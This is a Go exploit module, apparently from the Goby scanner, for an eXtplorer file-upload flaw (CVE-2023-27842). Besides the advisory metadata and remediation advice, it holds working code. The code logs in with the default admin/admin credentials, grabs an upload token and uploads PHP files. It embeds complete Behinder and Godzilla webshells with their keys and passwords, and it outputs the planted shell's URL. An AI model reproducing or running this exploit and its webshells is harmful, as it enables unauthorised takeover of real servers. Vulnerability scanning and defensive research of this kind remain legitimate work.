package exploits

import (
	"errors"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "eXtplorer index.php file upload vulnerability (CVE-2023-27842)",
    "Description": "<p>EXtplorer is a file manager based on PHP applications, which operates through web pages to edit, copy, move, delete files and directories, and even modify file permission properties.</p><p>Attackers can exploit the default user admin, default password admin, and backend file upload vulnerabilities to execute malicious code, write backdoors, and read sensitive files, which may lead to server attacks and control.</p>",
    "Product": "eXtplorer",
    "Homepage": "http://extplorer.net/",
    "DisclosureDate": "2023-03-05",
    "Author": "sunying",
    "FofaQuery": "title=\"eXtplorer\" || body=\"/eXtplorer.ico\" || header=\"eXtplorer\" || banner=\"eXtplorer\"",
    "GobyQuery": "title=\"eXtplorer\" || body=\"/eXtplorer.ico\" || header=\"eXtplorer\" || banner=\"eXtplorer\"",
    "Level": "2",
    "Impact": "<p>Attackers can exploit the default user admin, default password admin, and backend file upload vulnerabilities to execute malicious code, write backdoors, and read sensitive files, which may lead to server attacks and control.</p>",
    "Recommendation": "<p>1. Change the default password, which should preferably include uppercase and lowercase letters, numbers, and special characters, with more than 8 digits.</p><p>2. If not necessary, prohibit public network access to the system.</p><p>3. Set access policies and whitelist access through security devices such as firewalls.</p>",
    "References": [
        "https://github.com/tristao-marinho/CVE-2023-27842"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "behinder,godzilla,custom",
            "show": ""
        },
        {
            "name": "filename",
            "type": "input",
            "value": "hehllo1x2.php",
            "show": "attackType=custom"
        },
        {
            "name": "content",
            "type": "input",
            "value": "<?php echo \"Hello, world!\"; ?>",
            "show": "attackType=custom"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": []
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": []
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "File Upload"
    ],
    "VulType": [
        "File Upload"
    ],
    "CVEIDs": [
        "CVE-2023-27842"
    ],
    "CNNVD": [
        "CNNVD-202303-1623"
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "8.5",
    "Translation": {
        "CN": {
            "Name": "eXtplorer index.php 文件上传漏洞（CVE-2023-27842）",
            "Product": "eXtplorer",
            "Description": "<p>eXtplorer 是一款基于 php 应用的文件管理器，通过web页面进行操作，对文件和目录进行编辑、复制、移动和删除等操作，甚至还能修改文件的权限属性。</p><p>攻击者可以利用默认用户 admin 默认密码 admin，后台文件上传漏洞执行恶意代码、写入后门、读取敏感文件，从而可能导致服务器受到攻击并被控制。</p>",
            "Recommendation": "<p>1、修改默认口令，密码最好包含大小写字母、数字和特殊字符等，且位数大于8位。<br></p><p>2、如非必要，禁止公网访问该系统。<br></p><p>3、通过防火墙等安全设备设置访问策略，设置白名单访问。<br></p>",
            "Impact": "<p>攻击者可以利用默认用户 admin 默认密码 admin，后台文件上传漏洞执行恶意代码、写入后门、读取敏感文件，从而可能导致服务器受到攻击并被控制。<br></p>",
            "VulType": [
                "文件上传"
            ],
            "Tags": [
                "文件上传"
            ]
        },
        "EN": {
            "Name": "eXtplorer index.php file upload vulnerability (CVE-2023-27842)",
            "Product": "eXtplorer",
            "Description": "<p>EXtplorer is a file manager based on PHP applications, which operates through web pages to edit, copy, move, delete files and directories, and even modify file permission properties.</p><p>Attackers can exploit the default user admin, default password admin, and backend file upload vulnerabilities to execute malicious code, write backdoors, and read sensitive files, which may lead to server attacks and control.</p>",
            "Recommendation": "<p>1. Change the default password, which should preferably include uppercase and lowercase letters, numbers, and special characters, with more than 8 digits.</p><p>2. If not necessary, prohibit public network access to the system.</p><p>3. Set access policies and whitelist access through security devices such as firewalls.</p>",
            "Impact": "<p>Attackers can exploit the default user admin, default password admin, and backend file upload vulnerabilities to execute malicious code, write backdoors, and read sensitive files, which may lead to server attacks and control.<br></p>",
            "VulType": [
                "File Upload"
            ],
            "Tags": [
                "File Upload"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PostTime": "2023-11-27",
    "PocId": "10886"
}`
	obtainUploadTokenda312sdasda := func(hostInfo *httpclient.FixUrl, cookie string) (*httpclient.HttpResponse, error) {
		sendConfig := httpclient.NewGetRequestConfig("/index.php?option=com_extplorer&action=include_javascript&file=functions.js")
		sendConfig.VerifyTls = false
		sendConfig.FollowRedirect = false
		sendConfig.Header.Store("Cookie", cookie)
		return httpclient.DoHttpRequest(hostInfo, sendConfig)
	}

	validateLogon3das213 := func(hostInfo *httpclient.FixUrl) (*httpclient.HttpResponse, error) {
		sendConfig := httpclient.NewPostRequestConfig("/index.php")
		sendConfig.VerifyTls = false
		sendConfig.FollowRedirect = false
		sendConfig.Header.Store("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8")
		sendConfig.Header.Store("X-Requested-With", "XMLHttpRequest")
		sendConfig.Data = "option=com_extplorer&action=login&type=extplorer&username=admin&password=admin&lang=simplified_chinese"
		return httpclient.DoHttpRequest(hostInfo, sendConfig)
	}

	uploadFilesdsad31290as := func(hostInfo *httpclient.FixUrl, filename, content string) (*httpclient.HttpResponse, error) {
		loginResponse, err := validateLogon3das213(hostInfo)
		if err != nil {
			return nil, err
		} else if loginResponse.StatusCode != 200 && !strings.Contains(loginResponse.RawBody, "'success':true") {
			return nil, errors.New("漏洞利用失败")
		}
		uploadTokenResponse, err := obtainUploadTokenda312sdasda(hostInfo, loginResponse.Cookie)
		if err != nil {
			return nil, err
		}
		tokens := regexp.MustCompile(`token:\s*"([^"]+)"`).FindStringSubmatch(uploadTokenResponse.Utf8Html)
		if len(tokens) < 2 {
			tokens = []string{"", goutils.RandomHexString(32)}
		}
		token := tokens[1]
		uploadRequestConfig := httpclient.NewPostRequestConfig("/index.php")
		uploadRequestConfig.VerifyTls = false
		uploadRequestConfig.FollowRedirect = false
		uploadRequestConfig.Header.Store("Cookie", loginResponse.Cookie)
		uploadRequestConfig.Header.Store("Content-Type", "multipart/form-data; boundary=---------------------------106849294727430498781818238545")
		uploadRequestConfig.Data += "-----------------------------106849294727430498781818238545\r\nContent-Disposition: form-data; name=\"userfile[0]\"; filename=\"" + filename + "\"\r\nContent-Type: application/x-php\r\n\r\n" + content + "\r\n-----------------------------106849294727430498781818238545\r\nContent-Disposition: form-data; name=\"overwrite_files\"\r\n\r\non\r\n-----------------------------106849294727430498781818238545\r\nContent-Disposition: form-data; name=\"option\"\r\n\r\ncom_extplorer\r\n-----------------------------106849294727430498781818238545\r\nContent-Disposition: form-data; name=\"action\"\r\n\r\nupload\r\n-----------------------------106849294727430498781818238545\r\nContent-Disposition: form-data; name=\"dir\"\r\n\r\n/\r\n-----------------------------106849294727430498781818238545\r\nContent-Disposition: form-data; name=\"requestType\"\r\n\r\nxmlhttprequest\r\n-----------------------------106849294727430498781818238545\r\nContent-Disposition: form-data; name=\"confirm\"\r\n\r\ntrue\r\n-----------------------------106849294727430498781818238545\r\nContent-Disposition: form-data; name=\"token\"\r\n\r\n" + token + "\r\n-----------------------------106849294727430498781818238545--\r\n"
		uploadResponse, err := httpclient.DoHttpRequest(hostInfo, uploadRequestConfig)
		if err != nil {
			return nil, err
		} else if !strings.Contains(uploadResponse.RawBody, "'success':true") {
			return nil, errors.New("漏洞利用失败")
		}
		checkRequestConfig := httpclient.NewGetRequestConfig(`/` + filename)
		checkRequestConfig.VerifyTls = false
		checkRequestConfig.FollowRedirect = false
		return httpclient.DoHttpRequest(hostInfo, checkRequestConfig)
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostinfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			filename := goutils.RandomHexString(10) + ".php"
			content := goutils.RandomHexString(10)
			resp, _ := uploadFilesdsad31290as(hostinfo, filename, "<?php @error_reporting(0);echo \""+content+"\";unlink(__FILE__);?>")
			return resp != nil && strings.Contains(resp.RawBody, content)
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			attackType := goutils.B2S(ss.Params["attackType"])
			var content string
			filename := goutils.RandomHexString(10) + ".php"
			if attackType == "behinder" {
				// /*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/
				content = `<?php @error_reporting(0);session_start();$key="e45e329feb5d925b";$_SESSION['k']=$key;session_write_close();$post=file_get_contents("php://input");if(!extension_loaded('openssl')){$t="base64_"."decode";$post=$t($post."");for($i=0;$i<strlen($post);$i++){$post[$i]=$post[$i]^$key[$i+1&15];}}else{$post=openssl_decrypt($post,"AES128",$key);}$arr=explode('|',$post);$func=$arr[0];$params=$arr[1];class C{public function __invoke($p){eval($p."");}}@call_user_func(new C(),$params);echo "e165421110ba03099a1c0393373c5b43";?>`
			} else if attackType == "godzilla" {
				// 哥斯拉 pass key
				content = `<?php @session_start();@set_time_limit(0);@error_reporting(0);function encode($D,$K){for($i=0;$i<strlen($D);$i++){$c=$K[$i+1&15];$D[$i]=$D[$i]^$c;}return $D;}$pass='pass';$payloadName='payload';$key='3c6e0b8a9c15224a';if(isset($_POST[$pass])){$data=encode(base64_decode($_POST[$pass]),$key);if(isset($_SESSION[$payloadName])){$payload=encode($_SESSION[$payloadName],$key);if(strpos($payload,"getBasicsInfo")===false){$payload=encode($payload,$key);}eval($payload);echo substr(md5($pass.$key),0,16);echo base64_encode(encode(@run($data),$key));echo substr(md5($pass.$key),16);}else{if(strpos($data,"getBasicsInfo")!==false){$_SESSION[$payloadName]=encode($data,$key);}}}echo "e165421110ba03099a1c0393373c5b43";?>`
			} else if attackType == "custom" {
				filename = goutils.B2S(ss.Params["filename"])
				content = goutils.B2S(ss.Params["content"])
			} else {
				expResult.Output = `未知的利用方式`
				return expResult
			}
			if !strings.HasSuffix(filename, `.php`) {
				filename = filename + ".php"
			}
			resp, err := uploadFilesdsad31290as(expResult.HostInfo, filename, content)
			if err != nil {
				expResult.Output = err.Error()
			} else if resp.StatusCode == 200 || resp.StatusCode == 500 {
				expResult.Success = true
				expResult.Output = "WebShell URL: " + expResult.HostInfo.FixedHostInfo + "/" + filename + "\n"
				if attackType == "behinder" {
					expResult.Output += "Password: rebeyond\n"
					expResult.Output += "WebShell tool: Behinder v3.0\n"
				} else if attackType == "godzilla" {
					expResult.Output += "Password: pass 加密器：PHP_XOR_BASE64\n"
					expResult.Output += "WebShell tool: Godzilla v4.1\n"
				}
				expResult.Output += "Webshell type: php"
			} else {
				expResult.Output = `漏洞利用失败`
				expResult.Success = false
			}
			return expResult
		},
	))
}
